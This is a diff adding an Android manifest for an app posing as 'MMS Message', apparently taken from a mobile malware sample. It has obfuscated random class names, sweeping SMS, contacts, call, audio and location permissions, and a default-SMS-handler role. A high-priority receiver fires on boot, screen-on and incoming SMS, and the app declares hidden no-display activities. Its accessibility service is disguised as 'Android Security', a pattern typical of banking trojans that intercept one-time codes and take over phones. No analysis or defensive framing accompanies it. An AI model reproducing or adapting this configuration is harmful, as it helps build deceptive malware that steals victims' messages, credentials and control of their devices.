@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="wocwvy.czyxoxmbauu.slsa" platformBuildVersionCode="29" platformBuildVersionName="10">
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <application android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="MMS Message" android:name="wocwvy.czyxoxmbauu.slsa.rihynmfwilxiqz" android:supportsRtl="true" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="12211000"/>
+        <meta-data android:name="android.support.VERSION" android:value="26.1.0"/>
+        <meta-data android:name="android.arch.lifecycle.VERSION" android:value="27.0.0-SNAPSHOT"/>
+        <activity android:name="wocwvy.czyxoxmbauu.slsa.ncec.myvbo">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <receiver android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.cmtstflxlxb" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.qpgopfninoaazln" android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="wocwvy.czyxoxmbauu.slsa.opzsdswiddt">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+            </intent-filter>
+        </activity>
+        <service android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.lmimy" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.wfveenegvz"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.frvvkgp"/>
+        <receiver android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
+                <category android:name="android.intent.category.HOME"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.intent.action.DREAMING_STOPPED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/im" android:name="wocwvy.czyxoxmbauu.slsa.ncec.sxfl" android:theme="@android:style/Theme.NoDisplay"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.cwwzcpcu"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/im" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.pltrfi"/>
+        <activity android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.wami"/>
+        <activity android:icon="@drawable/im" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.fyqapyahei"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/im" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.bdxyqqt"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.ncec.dzudmx"/>
+        <activity android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.gcmysyhtova"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/im" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/im" android:label="" android:launchMode="singleTask" android:name="wocwvy.czyxoxmbauu.slsa.ncec.khypzruy"/>
+        <receiver android:enabled="true" android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hwfe"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.jtfxlnc"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.blkzyyyfc"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.whemsbk"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.clgqtzqdh"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.usbvhkriufnc"/>
+        <service android:label="Android Security" android:name="wocwvy.czyxoxmbauu.slsa.egxltnv" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/mihaf"/>
+        </service>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq"/>
+        <service android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.nvsdtnxkzjgw"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.xelytgswelv"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.mvqkjokaxfrpf"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.wahiuolww"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.ncec.kcdbt"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.ncec.fymeshs"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.ncec.ovyvpsbxxrtayd"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu"/>
+        <service android:enabled="true" android:exported="true" android:name="wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.dshd"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.kuv.sfswwunyakpjr"/>
+        <activity android:icon="@drawable/im" android:label="" android:name="wocwvy.czyxoxmbauu.slsa.ncec.zjwruw"/>
+        <service android:exported="false" android:name="wocwvy.czyxoxmbauu.slsa.ttiegryczsx"/>
+        <service android:name="wocwvy.czyxoxmbauu.slsa.blyvffs"/>
+    </application>
+</manifest>
